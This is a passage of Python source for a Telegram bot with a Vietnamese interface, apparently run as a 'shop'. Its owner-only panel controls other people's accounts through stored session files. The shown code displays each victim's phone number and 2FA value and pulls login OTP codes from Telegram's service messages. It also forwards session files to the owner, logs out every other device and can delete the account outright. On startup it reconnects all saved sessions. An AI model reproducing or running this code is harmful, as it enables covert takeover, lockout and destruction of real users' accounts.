────────────────
👤 **Tên:** {me.first_name if 'me' in locals() and me else 'N/A'} {me.last_name or ''}
🆔 **ID:** `{target_uid}`
💬 **Username:** `{username_str}`
📱 **SĐT:** `{phone_str}`
🔐 **2FA:** `{pwd_str}`
📊 **Trạng Thái Acc:** `{acc_status}`
⏱ **Thời Gian Đăng Nhập:** `{last_active}`
⏳ **Thời Gian Tự Động Kick:** `{time_left_str}`
"""
        buttons = [
            [Button.inline("🔑 Check OTP Gần Nhất", data="rmt_check_otp")],
            [Button.inline("📤 Gửi Lại File Session", data="rmt_send_session")],
            [Button.inline("📱 Check & Kick Thiết Bị Khác", data="rmt_kick_devices"), Button.inline("🗑 Xóa Tài Khoản", data="rmt_delete_account")],
            [Button.inline("🔙 Chọn Acc Khác", data="m_control")]
        ]
        await ev.edit(text=txt, buttons=buttons, parse_mode='markdown')

    elif data.startswith("kicked_otp_") or data.startswith("kicked_file_") or data.startswith("kicked_profile_"):
        if u != O_ID: return
        parts = data.split("_")
        action, target_uid = parts[1], int(parts[2])
        if action == "otp":
            await ev.respond(f"⚠️ Tài khoản `{target_uid}` đã bị xóa session tự động sau 24h.")
        elif action == "file":
            session_file = f"u_{target_uid}.session"
            if os.path.exists(session_file):
                await bot.send_file(O_ID, session_file, caption=f"📦 File session của UID: `{target_uid}`", parse_mode='markdown')
            else:
                await ev.respond(f"⚠️ File session của `{target_uid}` đã bị xóa.")
        elif action == "profile":
            await ev.respond(f"👤 **Thông tin tài khoản đã kick:**\n• UID: `{target_uid}`\n• SĐT: `+{user_phones.get(target_uid, 'Không rõ')}`")

    elif data == "rmt_check_otp":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        client = u_c.get(target_uid)
        if not client: return await ev.respond("⚠️ Tài khoản đã mất kết nối!")
        try:
            messages = await client.get_messages(777000, limit=3)
            for m in messages:
                if m.text and re.search(r'\b\d{5}\b', m.text):
                    return await ev.respond(f"🔑 **OTP MỚI NHẤT CỦA USER `{target_uid}`:**\n`{m.text}`")
            await ev.respond("⚠️ Không tìm thấy OTP gần đây!")
        except Exception as ex:
            await ev.respond(f"❌ Lỗi: {ex}")

    elif data == "rmt_send_session":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        session_file = f"u_{target_uid}.session"
        if os.path.exists(session_file):
            try:
                await bot.send_file(O_ID, session_file, caption=f"📦 **GỬI LẠI FILE SESSION**\n• ID User: `{target_uid}`", parse_mode='markdown')
                await ev.answer("✅ Đã gửi file session!", alert=True)
            except Exception as e:
                await ev.answer(f"❌ Lỗi: {e}", alert=True)
        else:
            await ev.answer("⚠️ Không tìm thấy file session!", alert=True)

    elif data == "rmt_kick_devices":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        client = u_c.get(target_uid)
        if not client: return await ev.respond("⚠️ Tài khoản đã mất kết nối!")
        kicked_count = 0
        try:
            auths = await client(functions.account.GetAuthorizationsRequest())
            for auth in auths.authorizations:
                if not auth.current:
                    try: 
                        await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                        kicked_count += 1
                    except: pass
            await bot.send_message(O_ID, f"✅ **ĐÃ KICK THIẾT BỊ KHÁC!**\n• UID: `{target_uid}`\n• Đã đá `{kicked_count}` thiết bị lạ.", parse_mode='markdown')
            await ev.answer(f"✅ Đã dọn dẹp {kicked_count} thiết bị lạ!", alert=True)
        except Exception as ex:
            await ev.respond(f"❌ Lỗi: {ex}")

    elif data == "rmt_delete_account":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        try:
            client = u_c.get(target_uid)
            if client: await client(functions.account.DeleteAccountRequest(reason="Admin cleaned"))
            if os.path.exists(f"u_{target_uid}.session"): os.remove(f"u_{target_uid}.session")
            u_c.pop(target_uid, None)
            await ev.respond("🗑 Đã xóa tài khoản thành công!")
        except Exception as ex:
            await ev.respond(f"❌ Lỗi: {ex}")

    elif data == "m_admin":
        if u != O_ID: return
        txt = "👑 **QUẢN LÝ NHÓM BẮT BUỘC**\n"
        for idx, g in enumerate(REQUIRED_GROUPS, 1):
            txt += f"{idx}. {g['name']} (@{g['username']})\n"
        buttons = [[Button.inline("🔙 Trở Về", data="shop_home")]]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

# ==========================================
# WEB SERVER GIỮ HOST 24/7 (RENDER)
# ==========================================
async def handle_ping(request):
    return web.Response(text="Shop System is running 24/7!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/ping', handle_ping)
    
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"🌐 Web Server đã khởi chạy tại port {port}...")
    return runner

async def main():
    asyncio.create_task(auto_clean_expired_sessions())
    
    await start_web_server()
    print("🚀 Bot Telegram đang khởi động kết nối API...")
    await bot.start(bot_token=B_TK)
    print("✅ Bot Telegram đã sẵn sàng hoạt động 24/7!")
    
    for f in glob.glob("u_*.session"):
        try:
            u_str = f.split('_')[1].split('.')[0]
            if not u_str.isdigit(): continue
            u = int(u_str)
            if u not in u_c:
                c = TelegramClient(f"u_{u}", A_ID, A_HS, connection_retries=5, timeout=30)
                await c.connect()
                if await c.is_user_authorized():
                    u_c[u] = c
                else: 
                    await c.disconnect()
                    try: os.remove(f)
                    except: pass
        except: pass
        
    await bot.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
